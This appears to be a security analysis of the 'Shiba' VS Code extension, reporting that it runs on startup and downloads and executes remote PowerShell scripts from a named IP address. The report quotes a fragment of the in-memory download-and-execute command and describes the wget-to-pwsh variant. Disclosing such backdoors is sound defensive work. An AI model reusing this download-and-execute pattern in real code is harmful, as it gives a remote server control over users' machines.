crowdsourced_ai_results.analysis:
Package: Shiba (vsix)
Version: 0.1.4
Description: 

The extension automatically activates on VS Code startup (`onStartupFinished`) and immediately executes a command (`shiba.aowoo`). This command uses `child_process.exec` to download and execute arbitrary scripts from a remote server (`http://54.85.145.93`). On Windows, it uses PowerShell to download and execute a `.ps1` script in memory (`iex (New-Object Net.WebClient).DownloadString(...)`). On Linux, it uses `wget` to download a `.ps1` script and pipes it to `pwsh` (PowerShell Core) for execution. This remote code execution capability, performed without user consent or transparency, allows the extension to run any code supplied by the remote server, effectively acting as a backdoor or downloader. The presence of similar logic in `extension_simple_cmd.js` and `back_up_extension.js`, along with the `changelog.md` entries detailing the evolution of this remote execution functionality, confirms the intentional nature of this behavior.
